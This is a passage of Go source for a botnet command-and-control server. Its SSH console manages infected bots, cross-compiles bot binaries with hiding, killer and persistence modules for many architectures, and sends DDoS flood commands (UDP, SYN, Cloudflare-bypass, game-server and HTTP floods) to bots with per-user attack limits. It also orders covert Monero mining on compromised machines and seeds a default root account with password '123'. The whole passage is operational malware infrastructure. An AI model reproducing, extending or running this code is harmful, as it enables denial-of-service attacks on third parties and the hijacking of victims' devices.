			term.Write([]byte(fmt.Sprintf("Average RAM/bot   : %.0f MB (%.2f GB)\r\n", avg, avg/1024.0)))
			term.Write([]byte(fmt.Sprintf("Minimum RAM       : %d MB\r\n", grandMin)))
			term.Write([]byte(fmt.Sprintf("Maximum RAM       : %d MB\r\n", grandMax)))
		case "ban":
			if username != "root" {
				term.Write([]byte("root only\r\n"))
				continue
			}
			if len(args) < 2 {
				term.Write([]byte("Usage: ban <ip>\r\n"))
				continue
			}
			ip := args[1]
			bannedMu.Lock()
			bannedIPs[ip] = true
			bannedMu.Unlock()
			botsMu.Lock()
			if c, ok := bots[ip]; ok {
				c.Conn.Close()
				delete(bots, ip)
				atomic.AddInt64(&botCount, -1)
			}
			botsMu.Unlock()
			term.Write([]byte(fmt.Sprintf("Banned %s\r\n", ip)))
		case "unban":
			if username != "root" {
				term.Write([]byte("root only\r\n"))
				continue
			}
			if len(args) < 2 {
				term.Write([]byte("Usage: unban <ip>\r\n"))
				continue
			}
			ip := args[1]
			bannedMu.Lock()
			delete(bannedIPs, ip)
			bannedMu.Unlock()
			term.Write([]byte(fmt.Sprintf("Unbanned %s\r\n", ip)))
		case "botips", "bot-ips", "botlist":
			type bip struct {
				addr   string
				reconn int
				busy   bool
				arch   string
				mode   string
			}
			var list []bip
			botsMu.RLock()
			for addr, c := range bots {
				list = append(list, bip{addr, c.ReconnectCount, c.Busy, c.Arch, c.Mode})
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("%-20s %-6s %-6s %-10s %-10s\r\n", "IP", "Reconn", "Busy", "Arch", "Mode")))
			for _, b := range list {
				busyStr := "no"
				if b.busy {
					busyStr = "yes"
				}
				term.Write([]byte(fmt.Sprintf("%-20s %-6d %-6s %-10s %-10s\r\n", b.addr, b.reconn, busyStr, b.arch, b.mode)))
			}
		case "update":
			if username != "root" {
				term.Write([]byte("root only\r\n"))
				continue
			}
			url := ""
			if len(args) >= 2 {
				url = args[1]
			}
			atomic.StoreInt64(&updateSuccess, 0)
			atomic.StoreInt64(&updateFail, 0)
			totalBots := atomic.LoadInt64(&botCount)
			if url == "" {
				broadcast("update")
			} else {
				broadcast("update " + url)
			}
			term.Write([]byte(fmt.Sprintf("Sent update to %d bots, waiting for responses...\r\n", totalBots)))
			time.Sleep(30 * time.Second)
			succ := atomic.LoadInt64(&updateSuccess)
			fail := atomic.LoadInt64(&updateFail)
			term.Write([]byte(fmt.Sprintf("Success: %d, Failed: %d\r\n", succ, fail)))
		case "payload", "payload-l4":
			if username == "root" {
				os.MkdirAll("bin", 0755)
				isL4 := cmd == "payload-l4" || (len(args) >= 2 && strings.ToLower(args[1]) == "l4")
				if isL4 {
					ip := getPublicIP()
					src := "BotL4"
					if _, err := os.Stat(src); os.IsNotExist(err) {
						src = "../" + src
					}
					l4src := src + "/Methods/l4"
					if _, lookErr := exec.LookPath("zig"); lookErr != nil {
						term.Write([]byte("[-] zig not found — run crosscompiler-install.sh\r\n"))
						continue
					}
					archs := []struct {
						name    string
						targets []string
					}{
						{"x86", []string{"x86-linux-musl"}},
						{"x86_64", []string{"x86_64-linux-musl"}},
						{"armv4l", []string{"arm-linux-musleabi"}},
						{"armv5l", []string{"arm-linux-musleabi"}},
						{"armv6l", []string{"arm-linux-musleabihf"}},
						{"armv7l", []string{"arm-linux-musleabihf"}},
						{"mips", []string{"mips-linux-musleabi", "mips-linux-musl"}},
						{"mipsel", []string{"mipsel-linux-musleabi", "mipsel-linux-musl"}},
						{"ppc", []string{"powerpc-linux-musleabi", "powerpc-linux-musl"}},
						{"ppc64", []string{"powerpc64-linux-musl"}},
					}
					for _, a := range archs {
						out := "bin/l4_" + a.name
						var lastErr error
						var lastOut []byte
						var built bool
						for _, trg := range a.targets {
							ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
							base := []string{"zig", "cc", "-target", trg,
								"-Wall", "-Os", "-s", "-static",
								"-pthread",
								fmt.Sprintf("-DSERVER_IP=\"%s\"", ip), "-o", out,
								src + "/bot.c", src + "/hide.c", src + "/killer.c", src + "/persist.c",
								l4src + "/udp.c", l4src + "/udpbypass.c", l4src + "/pps.c",
								l4src + "/tcp.c", l4src + "/tcpbypass.c", l4src + "/tcpstomp.c",
								l4src + "/syn.c", l4src + "/ack.c", l4src + "/dns.c",
								l4src + "/fortnite.c", l4src + "/minecraft.c", l4src + "/ssh.c",
								l4src + "/discord.c"}
							c := exec.CommandContext(ctx, base[0], base[1:]...)
							o, err := c.CombinedOutput()
							cancel()
							if err == nil {
								term.Write([]byte("[+] l4_" + a.name + " Built\r\n"))
								built = true
								break
							}
							lastErr = err
							lastOut = o
						}
						if !built {
							msg := strings.TrimSpace(string(lastOut))
							if msg == "" {
								msg = lastErr.Error()
							}
							term.Write([]byte("[-] l4_" + a.name + " FAILED:\r\n" + msg + "\r\n"))
						}
					}
				} else {
					botPkg := "./Bot"
					if _, err := os.Stat(botPkg); os.IsNotExist(err) {
						botPkg = "../" + botPkg[2:]
					}
					ip := getPublicIP()
					if d, err := os.ReadFile(botPkg + "/bot.go"); err == nil {
						s := string(d)
						if start := strings.Index(s, `ServerIP = "`); start != -1 {
							start += len(`ServerIP = "`)
							if end := strings.Index(s[start:], `"`); end != -1 {
								srcIP := s[start : start+end]
								if srcIP != "domain.com" && srcIP != "" {
									ip = srcIP
								}
							}
						}
					}
					ld := fmt.Sprintf("-X main.ServerIP=%s -X main.BotMode=full -s -w", ip)
					targets := [][]string{
						{"x86", "386"},
						{"i686", "386"},
						{"x86_64", "amd64"},
						{"armv7l", "arm"},
						{"armv6l", "arm"},
						{"armv5l", "arm"},
						{"mips", "mips"},
						{"mipsel", "mipsle"},
						{"ppc64", "ppc64"},
					}
					for _, t := range targets {
						outName := t[0]
						ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
						c := exec.CommandContext(ctx, "go", "build", "-p=1", "-trimpath",
							"-gcflags=-l -N", "-ldflags", ld, "-o", "bin/"+outName, botPkg)
						c.Env = append(os.Environ(),
							"GOOS=linux", "GOARCH="+t[1], "GOMAXPROCS=1",
							"GONOSUMCHECK=*", "GONOSUMDB=*", "GOFLAGS=-mod=mod",
							"GOGC=20", "GOMEMLIMIT=128MiB")
						switch t[0] {
						case "armv7l":
							c.Env = append(c.Env, "GOARM=7")
						case "armv6l":
							c.Env = append(c.Env, "GOARM=6")
						case "armv5l":
							c.Env = append(c.Env, "GOARM=5")
						}
						out, err := c.CombinedOutput()
						cancel()
						if err == nil {
							term.Write([]byte("[+] " + outName + " Built\r\n"))
						} else if ctx.Err() == context.DeadlineExceeded {
							term.Write([]byte("[-] " + outName + " timed out (10m limit)\r\n"))
						} else {
							term.Write([]byte("[-] Failed to build " + outName + ":\r\n" + string(out) + "\r\n"))
						}
					}
				}
			}
		case "udp", "udp-bypass", "pps", "udp-pps", "tcp", "tcp-bypass", "tcp-stomp", "syn", "ack", "dns", "fortnite", "minecraft", "ssh", "discord", "http", "http-bypass", "browser", "cache-bp", "cf-bypass", "cfpro", "cloudstorm", "erebus", "fatzx", "h2reset", "http-huricane", "httpkill", "hybrid", "ngtuan", "priv-flood", "tls", "xreset", "zenith":
			if len(args) < 3 {
				term.Write([]byte("Usage: see 'methods' for command syntax\r\n"))
				continue
			}
			users, err := loadUsers()
			if err != nil {
				term.Write([]byte("error loading user database\r\n"))
				continue
			}
			u := users[username]
			args[0] = strings.ToLower(args[0])
			var cleanArgs []string
			botLimit := 0
			if isScriptMethod(cmd) {
				cleanArgs = args
			} else {
				cleanArgs, botLimit = parseBotsFlag(args)
			}
			dur, err := strconv.Atoi(cleanArgs[len(cleanArgs)-1])
			if err != nil || dur <= 0 {
				term.Write([]byte("invalid duration\r\n"))
				continue
			}
			if dur > u.MaxTime && username != "root" {
				term.Write([]byte("time limit exceeded\r\n"))
				continue
			}
			activeAttacksMu.Lock()
			if len(activeAttacks[username]) >= u.Concurrents {
				activeAttacksMu.Unlock()
				term.Write([]byte("too many attacks already\r\n"))
				continue
			}
			requireMode := ""
			if isL4Method(cmd) {
				requireMode = "l4"
			} else if isL7Method(cmd) || isScriptMethod(cmd) {
				requireMode = "l7"
			}
			id := atomic.AddInt64(&lastAttackID, 1)
			p := "80"
			if len(cleanArgs) >= 4 {
				p = cleanArgs[2]
			}
			var botAddrs []string
			if botLimit > 0 {
				var sent int
				botAddrs, sent = broadcastToN(strings.Join(cleanArgs, " "), botLimit, requireMode)
				if sent == 0 {
					activeAttacksMu.Unlock()
					term.Write([]byte("no free bots available\r\n"))
					continue
				}
				banner := attackBanner(cleanArgs[1], p, dur, id, sent)
				term.Write([]byte(banner))
			} else {
				botAddrs, _ = broadcastAll(strings.Join(cleanArgs, " "), requireMode)
				banner := attackBanner(cleanArgs[1], p, dur, id, len(botAddrs))
				term.Write([]byte(banner))
			}
			atk := AttackInfo{ID: id, Target: cleanArgs[1], Port: p, Method: cmd, Duration: dur, EndTime: time.Now().Unix() + int64(dur), BotAddrs: botAddrs}
			activeAttacks[username] = append(activeAttacks[username], atk)
			activeAttacksMu.Unlock()

			go func(user string, aid int64, d int, baddrs []string) {
				time.Sleep(time.Duration(d) * time.Second)
				activeAttacksMu.Lock()
				atks := activeAttacks[user]
				found := false
				for i, a := range atks {
					if a.ID == aid {
						activeAttacks[user] = append(atks[:i], atks[i+1:]...)
						found = true
						break
					}
				}
				activeAttacksMu.Unlock()
				if found && len(baddrs) > 0 {
					freeBots(baddrs)
				}
			}(username, id, dur, botAddrs)
		case "monero":
			if username == "root" {
				if len(args) < 4 {
					term.Write([]byte("Usage: monero <count> <wallet> <pool:port> <hours>\r\n"))
					continue
				}
				count, _ := strconv.Atoi(args[1])
				wallet := args[2]
				pool := args[3]
				hours, _ := strconv.Atoi(args[4])
				if hours < 1 {
					hours = 1
				}
				dur := hours * 3600
				users, _ := loadUsers()
				u := users[username]
				activeAttacksMu.Lock()
				if len(activeAttacks[username]) >= u.Concurrents {
					activeAttacksMu.Unlock()
					term.Write([]byte("too many attacks already\r\n"))
					continue
				}
				id := atomic.AddInt64(&lastAttackID, 1)
				moneroCmd := fmt.Sprintf("monero %s %s %d", wallet, pool, dur)
				botAddrs, sent := broadcastToN(moneroCmd, count, "")
				if sent == 0 {
					activeAttacksMu.Unlock()
					term.Write([]byte("no free bots available\r\n"))
					continue
				}
				atk := AttackInfo{ID: id, Target: "monero", Port: "0", Method: "monero", Duration: dur, EndTime: time.Now().Unix() + int64(dur), BotAddrs: botAddrs}
				activeAttacks[username] = append(activeAttacks[username], atk)
				activeAttacksMu.Unlock()
				term.Write([]byte(fmt.Sprintf("Mining started on %d bots for %d hours (attack ID %d)\r\n", sent, hours, id)))
				go func(user string, aid int64, d int, baddrs []string) {
					time.Sleep(time.Duration(d) * time.Second)
					activeAttacksMu.Lock()
					atks := activeAttacks[user]
					found := false
					for i, a := range atks {
						if a.ID == aid {
							activeAttacks[user] = append(atks[:i], atks[i+1:]...)
							found = true
							break
						}
					}
					activeAttacksMu.Unlock()
					if found && len(baddrs) > 0 {
						freeBots(baddrs)
					}
				}(username, id, dur, botAddrs)
			}
		case "cls", "clear":
			term.Write([]byte(planetBanner()))
		default:
			term.Write([]byte("Unknown command. Type 'help' or '?'.\r\n"))
		case "exit":
			return
		}
	}
}

func initStorage() error {
	os.MkdirAll(userDir, 0755)
	p := filepath.Join(userDir, userFile)
	if _, err := os.Stat(p); os.IsNotExist(err) {
		db := UserDatabase{"root": {Password: "123", MaxTime: 3600, Concurrents: 100, Expiry: 4102444800, Admin: true}}
		d, _ := json.MarshalIndent(db, "", "  ")
		return os.WriteFile(p, d, 0644)
	}
	return nil
}

func loadUsers() (UserDatabase, error) {
	userDbMu.RLock()
	defer userDbMu.RUnlock()
	d, err := os.ReadFile(filepath.Join(userDir, userFile))
	if err != nil {
		return nil, err
	}
	var db UserDatabase
	if err := json.Unmarshal(d, &db); err != nil {
		return nil, err
	}
	if db == nil {
		return nil, fmt.Errorf("empty user database")
	}
	return db, nil
}

func saveUsers(db UserDatabase) {
	userDbMu.Lock()
	defer userDbMu.Unlock()
	d, err := json.MarshalIndent(db, "", "  ")
	if err != nil {
		return
	}
	os.WriteFile(filepath.Join(userDir, userFile), d, 0644)
}

func attackBanner(target, port string, dur int, id int64, bots int) string {
	lines := strings.Split(skullArt, "\n")
	var sb strings.Builder
	sb.WriteString("\033[2J\033[H")
	textLine := len(lines) - 1 // bottom line
	for i, line := range lines {
		sb.WriteString(line)
		if i == textLine {
			sb.WriteString(fmt.Sprintf("     Attack sent on %s:%s for %d seconds | ID: %d | Bots: %d", target, port, dur, id, bots))
		}
		sb.WriteString("\r\n")
	}
	return sb.String()
}

func planetBanner() string {
	return "\033[2J\033[H" + planetArt
}

func loadOrGenerateHostKey() (ssh.Signer, error) {
	k := "server.key"
	if d, err := os.ReadFile(k); err == nil {
		return ssh.ParsePrivateKey(d)
	}
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	b := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}
	d := pem.EncodeToMemory(b)
	os.WriteFile(k, d, 0600)
	return ssh.NewSignerFromKey(key)
}
